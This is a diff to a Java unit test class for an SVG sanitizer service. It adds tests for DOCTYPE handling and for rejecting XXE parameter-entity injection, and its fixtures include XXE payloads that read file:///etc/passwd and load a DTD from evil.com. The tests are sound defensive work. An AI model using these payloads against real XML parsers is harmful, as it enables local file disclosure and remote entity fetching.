@@ -36,6 +36,26 @@ class SvgSanitizerServiceTest {
     }
 
     @Test
+    @DisplayName("Should allow standard SVG with DOCTYPE declaration (W3C / Adobe Illustrator / Inkscape)")
+    void sanitize_SvgWithStandardDoctype() {
+        String svgWithDoctype = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
+                "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\" [\n" +
+                "    <!ENTITY ns_svg \"http://www.w3.org/2000/svg\">\n" +
+                "]>\n" +
+                "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
+                "<path d=\"M10 10 H 90 V 90 H 10 Z\" fill=\"blue\"/>\n" +
+                "</svg>";
+
+        byte[] result = sanitizerService.sanitizeAndValidateSvg(svgWithDoctype.getBytes(StandardCharsets.UTF_8));
+        String resultStr = new String(result, StandardCharsets.UTF_8);
+
+        assertThat(resultStr).contains("<svg");
+        assertThat(resultStr).contains("<path");
+        assertThat(resultStr).contains("fill=\"blue\"");
+        assertThat(resultStr).doesNotContain("<!DOCTYPE");
+    }
+
+    @Test
     @DisplayName("Should strip <script> tag from malicious SVG")
     void sanitize_RemoveScriptTag() {
         String maliciousSvg = "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">" +
@@ -106,6 +126,23 @@ class SvgSanitizerServiceTest {
                 "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n" +
                 "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                 "<text>&xxe;</text>\n" +
+                "</svg>";
+
+        assertThatThrownBy(() -> sanitizerService.sanitizeAndValidateSvg(xxeSvg.getBytes(StandardCharsets.UTF_8)))
+                .isInstanceOf(InvalidSvgException.class)
+                .hasMessageContaining("XXE protection");
+    }
+
+    @Test
+    @DisplayName("Should reject XXE parameter entity injection")
+    void sanitize_RejectXXEParameterEntity() {
+        String xxeSvg = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
+                "<!DOCTYPE svg [\n" +
+                "  <!ENTITY % dtd SYSTEM \"http://evil.com/xxe.dtd\">\n" +
+                "  %dtd;\n" +
+                "]>\n" +
+                "<svg width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
+                "<text>test</text>\n" +
                 "</svg>";
 
         assertThatThrownBy(() -> sanitizerService.sanitizeAndValidateSvg(xxeSvg.getBytes(StandardCharsets.UTF_8)))
